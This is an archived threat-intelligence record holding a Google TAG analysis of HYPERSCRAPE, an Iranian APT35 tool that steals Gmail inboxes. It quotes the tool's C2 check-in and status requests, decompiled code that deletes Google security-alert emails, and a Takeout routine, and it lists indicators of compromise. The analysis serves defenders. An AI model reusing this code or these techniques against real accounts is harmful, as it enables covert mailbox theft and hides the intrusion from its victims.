{
    "id": "84e489d7-fa76-4f5d-9654-1bdde7784ceb",
    "created_at": "2023-01-12T15:03:02.912716Z",
    "updated_at": "2025-03-27T02:16:11.516526Z",
    "deleted_at": null,
    "sha1_hash": "9cccb31bea10d11822dcaca5e8240610147a8648",
    "title": "2022-08-23 - New Iranian APT data extraction tool",
    "authors": "",
    "file_creation_date": "2022-09-01T10:16:46Z",
    "file_modification_date": "2022-09-01T10:16:46Z",
    "file_size": 563605,
    "plain_text": "# New Iranian APT data extraction tool\n\n**blog.google/threat-analysis-group/new-iranian-apt-data-extraction-tool/**\n\nAjax Bash August 23, 2022\n\n[Threat Analysis Group](https://blog.google/threat-analysis-group/)\n\nAs part of TAG's mission to counter serious threats to Google and our users, we've analyzed a range of persistent\n[threats including APT35 and Charming Kitten, an Iranian government-backed group that regularly targets high risk](https://blog.google/threat-analysis-group/countering-threats-iran/)\nusers. For years, we have been countering this group’s efforts to hijack accounts, deploy malware, and their use of\nnovel techniques to conduct espionage aligned with the interests of the Iranian government. Now, we’re shining light\non a new tool of theirs.\n\nIn December 2021, TAG discovered a novel Charming Kitten tool, named HYPERSCRAPE, used to steal user data\nfrom Gmail, Yahoo!, and Microsoft Outlook accounts. The attacker runs HYPERSCRAPE on their own machine to\ndownload victims’ inboxes using previously acquired credentials. We have seen it deployed against fewer than two\ndozen accounts located in Iran. The oldest known sample is from 2020, and the tool is still under active development.\nWe have taken actions to re-secure these accounts and have notified the victims through our Government Backed\nAttacker Warnings.\n\nThis post will provide technical details about HYPERSCRAPE, similar to PWC’s recently published analysis on a\n[Telegram grabber tool. HYPERSCRAPE demonstrates Charming Kitten’s commitment to developing and maintaining](https://www.pwc.com/gx/en/issues/cybersecurity/cyber-threat-intelligence/old-cat-new-tricks.html)\npurpose-built capabilities. Like much of their tooling, HYPERSCRAPE is not notable for its technical sophistication,\nbut rather its effectiveness in accomplishing Charming Kitten’s objectives.\n\n## HYPERSCRAPE Analysis\n\nHYPERSCRAPE requires the victim’s account credentials to run using a valid, authenticated user session the\nattacker has hijacked, or credentials the attacker has already acquired. It spoofs the user agent to look like an\noutdated browser, which enables the basic HTML view in Gmail. Once logged in, the tool changes the account’s\nlanguage settings to English and iterates through the contents of the mailbox, individually downloading messages as\n.eml files and marking them unread. After the program has finished downloading the inbox, it reverts the language\nback to its original settings and deletes any security emails from Google. Earlier versions contained the option to\nrequest data from Google Takeout a feature which allows users to export their data to a downloadable archive file\n\n\n-----\n\nThe tool is written in .NET for Windows PCs and is designed to run on the attacker s machine. We tested\nHYPERSCRAPE in a controlled environment with a test Gmail Account, although functionality may differ for Yahoo!\nand Microsoft accounts. HYPERSCRAPE won't run unless in a directory with other file dependencies.\n\nHYPERSCRAPE file metadata\n\n## HYPERSCRAPE Setup\n\n\n-----\n\nWhen launched, the tool makes an HTTP GET request to a C2 to check for a response body of OK and will\nterminate if it's not found. In the version tested, the C2 was unobfuscated and stored as a hardcoded string. In later\nversions it was obfuscated with Base64.\n\nGET http://{C2}/Index.php?Ck=OK HTTP/1.1\n\nHost: {C2}\n\nAccept-Encoding: gzip\n\nConnection: Keep-Alive\n\nThe tool accepts arguments from the command line such as the mode of operation, an identifier string, and a path\nstring to a valid cookie file. A new form is displayed if the information is not provided via command prompt.\n\nInitial form to specify operation parameters\n\nOnce provided, the data in the \"Identity\" field is sent to a C2 for confirmation. Again, the response is expected to be\n\"OK\".\n\nGET http://{C2}/Index.php?vubc={identity} HTTP/1.1\n\nHost: {C2}\n\nAccept-Encoding: gzip\n\nIf the cookie file path was not supplied via the command line, a new form will allow the operator to do so using drag\nand drop.\n\n\n-----\n\nThe cookie drag and drop form\n\nAfter parsing, the cookies are inserted into a local cache used by the embedded web browser. A new folder named\n\"Download\" is created adjacent to the main binary. The browser then navigates to Gmail to begin the data collection.\n\nThe user agent is spoofed so it appears like an outdated browser, which results in an error message and allows the\nattacker to enable the basic HTML view in Gmail.\n\n\n-----\n\nThe error page from using an unsupported browser\n\nIf the cookies failed to provide access to the account, a login page is displayed and the attacker can manually enter\ncredentials to proceed, as the program will wait until it finds the inbox page.\n\n\n-----\n\nThe login page\n\n## What HYPERSCRAPE does\n\nOnce the attacker has logged in to the victim’s account, HYPERSCRAPE checks to see if the language is set to\nEnglish, changing it if not. The language is returned to its original setting when the run is finished.\n\nHYPERSCRAPE then begins iterating through all available tabs in the inbox looking for emails to download. It does\nthe following for each email found:\n\nClicks on the email and opens it\nDownloads it\nIf the email was originally unread, marks it unread\nGoes back to the inbox\n\nThe emails are saved with \".eml\" extensions under the Downloads directory with the filename corresponding to the\nsubject. A log file is written containing a count of the emails that were downloaded.\n\n\n-----\n\nWhen finished, a HTTP POST request is made to the C2 to relay the status and system information. The downloaded\nemails are not sent to the C2.\n\nPOST http://{C2}/?Key={GUID}&Crc={Identifier}\n\n{\n\n\"appName\": \"Gmail Downloader\",\n\n\"targetname\": \"{Email}\",\n\n\"HostName\": \"REDACTED\",\n\n\"srcUserIP\": \"REDACTED\",\n\n\"actionType\": \"First\",\n\n\"timeOccurrence\": \"05/01/2022 05:50:31 PM\",\n\n\"OS\": \"REDACTED\",\n\n\"OSVersion\": \"REDACTED\",\n\n\"SystemModel\": \"REDACTED\",\n\n\"SystemType\": \"REDACTED\",\n\n\"srcName\": \"REDACTED\",\n\n\"srcOrgName\": \"REDACTED\"\n\n}\n\nThe program will delete any security emails from Google generated by the attacker’s activity\n\n\n-----\n\nprivate bool IsThereAnyEMail() {\n\nList < GeckoHtmlElement > list = (from x in this.geckoWebBrowser.Document.GetElementsByTagName(\"span\")\n\nwhere x.TextContent.StartsWith (\"Security alert\") || x.TextContent.StartsWith(\"Archive of Google data requested\") ||\nx.TextContent.StartsWith(\"Your Google data archive is ready\") || x.TextContent.StartsWith(\"Your Google data is\nready\") || x.TextContent.StartsWith(\"Critical security alert\") || x.TextContent.StartsWith(\"Access for less secure apps\nhas been turned on\") || x.TextContent.StartsWith(\"Review blocked sign-in attempt\") || x.TextContent.StartsWith(\"Help\nus protect you: Security advice from Google\") || x.TextContent.StartsWith(\"Access for less secure apps has been\nturned on\")\n\nselect x).ToList < GeckoHtmlElement > ();\n\nbool flag = list.Count == 0;\n\nreturn !flag;\n\n}\n\n## Early versions contained an option to request Google Takeout data\n\nData from [Google Takeout is also available upon request, but the option was only found in early builds. The](https://support.google.com/accounts/answer/3024190?hl=en)\nfunctionality was not automated and it's unclear why it was removed in later versions.\n\nWhen conducting a Takeout, the program will spawn a new copy of itself and initialize a pipe communication channel\nto relay the cookies and account name, both of which are required to accomplish the Takeout. When they are\nreceived, the browser navigates to the official Takeout link to request and eventually download the exported data.\n\npublic void ManageTakeOut() {\n\nstring text = \"PipeName\";\n\nProcess process = new Process();\n\nprocess.StartInfo.Arguments = string.Format(\"PIPE Google \\\"{0}\\\"\", text);\n\nprocess.StartInfo.FileName = Process.GetCurrentProcess().MainModule.FileName;\n\nprocess.Start();\n\nPipeCommunication pipeCommunication = new PipeCommunication(true, text);\n\nbool flag = false;\n\nwhile (!flag) {\n\ntry {\n\nJsonInfo jsonInfo = pipeCommunication.Read();\n\nswitch (jsonInfo.Type) {\n\ncase JsonType.GetCookies:\n\njsonInfo.Data = this.CookieText;\n\npipeCommunication.Write(jsonInfo);\n\nbreak;\n\n\n-----\n\ncase JsonType.TakeOutFile:\n\nflag = true;\n\nbreak;\n\ncase JsonType.GetUsername:\n\nwhile (this.OperationObject.GetUsername() == null) {\n\nThread.Sleep(1000);\n\n}\n\njsonInfo.Data = this.OperationObject.GetUsername();\n\npipeCommunication.Write(jsonInfo);\n\nbreak;\n\n}\n\n} catch (Exception) {\n\nbool hasExited = process.HasExited;\n\nif (hasExited) {\n\nflag = true;\n\n}\n\n}\n\n}\n\npipeCommunication.Close();\n\n}\n\n## Protecting Our Users\n\nTAG is committed to sharing research to raise awareness on bad actors like Charming Kitten within the security\ncommunity, and for companies and individuals that may be targeted. It’s why we do things like work with our\nCyberCrime Investigation Group to share critical information relevant to law enforcement. We hope doing so will\nimprove understanding of tactics and techniques that will enhance threat hunting capabilities and lead to stronger\nprotections across the industry. We’ll also continue to apply those findings internally to improve the safety and security\nof our products so we can effectively combat threats and protect users who rely on our services. In the meantime, we\n[encourage high risk users to enroll in our Advanced Protection Program (APP) and utilize Google Account Level](https://landing.google.com/advancedprotection/)\nEnhanced Safe Browsing to ensure they have the greatest level of protection in the face of ongoing threats.\n\n## HYPERSCRAPE Indicators\n\nC2s\n\n136.243.108.14\n\n173.209.51.54\n\n\n-----\n\nHYPERSCRAPE binaries\n\n03d0e7ad4c12273a42e4c95d854408b98b0cf5ecf5f8c5ce05b24729b6f4e369\n\n35a485972282b7e0e8e3a7a9cbf86ad93856378fd96cc8e230be5099c4b89208\n\n5afc59cd2b39f988733eba427c8cf6e48bd2e9dc3d48a4db550655efe0dca798\n\n6dc0600de00ba6574488472d5c48aa2a7b23a74ff1378d8aee6a93ea0ee7364f\n\n767bd025c8e7d36f64dbd636ce0f29e873d1e3ca415d5ad49053a68918fe89f4\n\n977f0053690684eb509da27d5eec2a560311c084a4a133191ef387e110e8b85f\n\nac8e59e8abeacf0885b451833726be3e8e2d9c88d21f27b16ebe00f00c1409e6\n\ncd2ba296828660ecd07a36e8931b851dda0802069ed926b3161745aae9aa6daa\n\nMicrosoft Live DLL\n\n1a831a79a932edd0398f46336712eff90ebb5164a189ef38c4dacc64ba84fe23\n\nPDB\n\nE:\\Working\\Projects\\EmailDownloader\\EmailDownloaderCookieMode\\EmailDownloader\\obj\\Debug\\EmailDownloader.pdb\n\nE:\\Working\\Projects\\EmailDownloader\\EmailDownloaderCookieMode\\Mahdi\\LiveLib\\obj\\Release\\LiveLib.pdb\n\nPOSTED IN:\n\n[Threat Analysis Group](https://blog.google/threat-analysis-group/%20)\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2022/2022-08-23 - New Iranian APT data extraction tool.pdf"
    ],
    "report_names": [
        "2022-08-23 - New Iranian APT data extraction tool.pdf"
    ],
    "threat_actors": [
        {
            "id": "82b92285-4588-48c9-8578-bb39f903cf62",
            "created_at": "2022-10-25T15:50:23.850506Z",
            "updated_at": "2025-03-27T02:00:55.501372Z",
            "deleted_at": null,
            "main_name": "Charming Kitten",
            "aliases": [
                "Charming Kitten"
            ],
            "source_name": "MITRE:Charming Kitten",
            "tools": [
                "DownPaper"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "b07fec96-80cd-4d92-aa52-a26a0b25b7c2",
            "created_at": "2022-10-25T16:07:23.826594Z",
            "updated_at": "2025-03-27T02:02:09.994638Z",
            "deleted_at": null,
            "main_name": "Madi",
            "aliases": [
                "Mahdi"
            ],
            "source_name": "ETDA:Madi",
            "tools": [
                "Madi"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "aa73cd6a-868c-4ae4-a5b2-7cb2c5ad1e9d",
            "created_at": "2022-10-25T16:07:24.139848Z",
            "updated_at": "2025-03-27T02:02:10.120505Z",
            "deleted_at": null,
            "main_name": "Safe",
            "aliases": [],
            "source_name": "ETDA:Safe",
            "tools": [
                "DebugView",
                "LZ77",
                "OpenDoc",
                "SafeDisk",
                "TypeConfig",
                "UPXShell",
                "UsbDoc",
                "UsbExe"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "d8af157e-741b-4933-bb4a-b78490951d97",
            "created_at": "2023-01-06T13:46:38.748929Z",
            "updated_at": "2025-03-27T02:00:02.908256Z",
            "deleted_at": null,
            "main_name": "APT35",
            "aliases": [
                "Newscaster Team",
                "Magic Hound",
                "G0059",
                "Phosphorus",
                "Mint Sandstorm",
                "TunnelVision",
                "COBALT MIRAGE"
            ],
            "source_name": "MISPGALAXY:APT35",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "029625d2-9734-44f9-9e10-b894b4f57f08",
            "created_at": "2023-01-06T13:46:38.364105Z",
            "updated_at": "2025-03-27T02:00:02.815023Z",
            "deleted_at": null,
            "main_name": "Charming Kitten",
            "aliases": [
                "Parastoo",
                "iKittens",
                "Group 83",
                "NewsBeef",
                "G0058",
                "CharmingCypress"
            ],
            "source_name": "MISPGALAXY:Charming Kitten",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "08a3b64c-8e18-455d-af57-28dca63808c4",
            "created_at": "2024-05-01T02:03:08.027871Z",
            "updated_at": "2025-03-27T02:05:17.313679Z",
            "deleted_at": null,
            "main_name": "COBALT ILLUSION",
            "aliases": [
                "APT42 ",
                "Charming Kitten ",
                "CharmingCypress ",
                "ITG18 ",
                "Magic Hound ",
                "Mint Sandstorm sub-group ",
                "NewsBeef ",
                "Newscaster ",
                "PHOSPHORUS sub-group ",
                "TA453 ",
                "UNC788 ",
                "Yellow Garuda ",
                "APT35 "
            ],
            "source_name": "Secureworks:COBALT ILLUSION",
            "tools": [
                " MagicHound Toolset",
                " PupyRAT",
                "Browser Exploitation Framework (BeEF)"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "e3676dfe-3d40-4b3a-bfbd-4fc1f8c896f4",
            "created_at": "2022-10-25T15:50:23.808974Z",
            "updated_at": "2025-03-27T02:00:55.550912Z",
            "deleted_at": null,
            "main_name": "Magic Hound",
            "aliases": [
                "Magic Hound",
                "TA453",
                "COBALT ILLUSION",
                "Charming Kitten",
                "ITG18",
                "Phosphorus",
                "APT35",
                "Mint Sandstorm"
            ],
            "source_name": "MITRE:Magic Hound",
            "tools": [
                "Impacket",
                "CharmPower",
                "FRP",
                "Mimikatz",
                "Systeminfo",
                "ipconfig",
                "netsh",
                "PowerLess",
                "Pupy",
                "DownPaper",
                "PsExec",
                "Havij",
                "sqlmap"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "1699fb41-b83f-42ff-a6ec-984ae4a1031f",
            "created_at": "2022-10-25T16:07:23.83826Z",
            "updated_at": "2025-03-27T02:02:09.995863Z",
            "deleted_at": null,
            "main_name": "Magic Hound",
            "aliases": [
                "APT 35",
                "Ballistic Bobcat",
                "Charming Kitten",
                "CharmingCypress",
                "Cobalt Illusion",
                "Cobalt Mirage",
                "Educated Manticore",
                "Magic Hound",
                "Mint Sandstorm",
                "Operation BadBlood",
                "Operation Sponsoring Access",
                "Operation SpoofedScholars",
                "Operation Thamar Reservoir",
                "Phosphorus",
                "TA453",
                "TEMP.Beanie",
                "Tarh Andishan",
                "Timberworm",
                "TunnelVision",
                "UNC788",
                "Yellow Garuda"
            ],
            "source_name": "ETDA:Magic Hound",
            "tools": [
                "7-Zip",
                "AnvilEcho",
                "BASICSTAR",
                "CORRUPT KITTEN",
                "CWoolger",
                "CharmPower",
                "ChromeHistoryView",
                "CommandCam",
                "DistTrack",
                "DownPaper",
                "FRP",
                "Fast Reverse Proxy",
                "FireMalv",
                "Ghambar",
                "GoProxy",
                "GorjolEcho",
                "HYPERSCRAPE",
                "Havij",
                "MPK",
                "MPKBot",
                "Matryoshka",
                "Matryoshka RAT",
                "MediaPl",
                "Mimikatz",
                "MischiefTut",
                "NETWoolger",
                "NOKNOK",
                "PINEFLOWER",
                "POWERSTAR",
                "PowerLess Backdoor",
                "PsList",
                "Pupy",
                "PupyRAT",
                "SNAILPROXY",
                "Shamoon",
                "TDTESS",
                "WinRAR",
                "WoolenLogger",
                "Woolger",
                "pupy",
                "sqlmap"
            ],
            "source_id": "ETDA",
            "reports": null
        }
    ],
    "ts_created_at": 1673535782,
    "ts_updated_at": 1743041771,
    "ts_creation_date": 1662027406,
    "ts_modification_date": 1662027406,
    "files": {
        "pdf": "https://archive.orkl.eu/9cccb31bea10d11822dcaca5e8240610147a8648.pdf",
        "text": "https://archive.orkl.eu/9cccb31bea10d11822dcaca5e8240610147a8648.txt",
        "img": "https://archive.orkl.eu/9cccb31bea10d11822dcaca5e8240610147a8648.jpg"
    }
}